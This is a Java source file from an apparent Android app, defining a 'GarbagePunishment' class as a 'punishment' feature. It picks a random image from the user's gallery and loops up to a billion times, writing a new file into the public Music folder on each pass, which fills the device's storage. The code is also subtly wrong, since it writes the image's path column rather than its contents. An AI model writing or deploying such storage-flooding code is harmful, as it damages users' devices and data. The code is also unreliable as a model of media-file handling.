package com.aghacks.hellsbells.punishments;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Random;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.MediaStore.Images.ImageColumns;
import android.util.Log;

public class GarbagePunishment {

	private static final String TAG = "GarbagePunishment";
	private Activity context;

	public GarbagePunishment(Activity activity) {
		this.context = activity;
	}

	public void execute() {
		ContentResolver cr = context.getContentResolver();

		String[] columns = new String[] { ImageColumns._ID, ImageColumns.TITLE,
				ImageColumns.DATA, ImageColumns.MIME_TYPE, ImageColumns.SIZE };
		Cursor cur = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
				columns, null, null, null);
		Random rand = new Random();
		Log.d(TAG, cur.getCount() + "");
		cur.moveToPosition(rand.nextInt(cur.getCount()));
		Log.i(TAG, cur.getString(cur.getColumnIndex(ImageColumns.TITLE)));
		for (long i = 0; i < 1000000000; ++i) {
			try {
				FileOutputStream fos = new FileOutputStream(
						Environment
								.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC)
								+ "/" + cur.getString(cur.getColumnIndex(ImageColumns.TITLE)) + i);
				fos.write(cur.getBlob(cur.getColumnIndex(ImageColumns.DATA)));
				fos.close();
			} catch (IOException e) {
				Log.e(TAG, e.getLocalizedMessage(), e);
				e.printStackTrace();
			}
		}

	}

}
